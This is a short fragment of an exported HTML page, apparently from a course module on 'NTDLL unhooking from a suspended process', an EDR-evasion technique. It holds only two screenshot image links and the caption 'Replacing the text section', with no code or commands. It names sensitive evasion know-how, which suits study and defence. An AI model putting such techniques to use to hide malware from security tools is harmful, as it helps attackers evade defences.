href="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-518679693-f19b0159-5abb-4c98-88c0-091ea2cdfa31.png"><img style="width:1444px" src="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-518679693-f19b0159-5abb-4c98-88c0-091ea2cdfa31.png"/></a></figure><p id="66311b2f-e404-4752-aee4-2e35c83864ba" class="">Replacing the text section.</p><figure id="e1e31935-8634-40fa-96db-9e17df003305" class="image"><a href="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-618679699-59d3f22d-e8a0-4d1d-9a61-85a48845db8b.png"><img style="width:1442px" src="86%20NTDLL%20Unhooking%20-%20From%20a%20Suspended%20Process%20b586e5f76b064f63a867c116853ff11a/ntdll-suspended-process-618679699-59d3f22d-e8a0-4d1d-9a61-85a48845db8b.png"/></a></figure></div></article></body></html>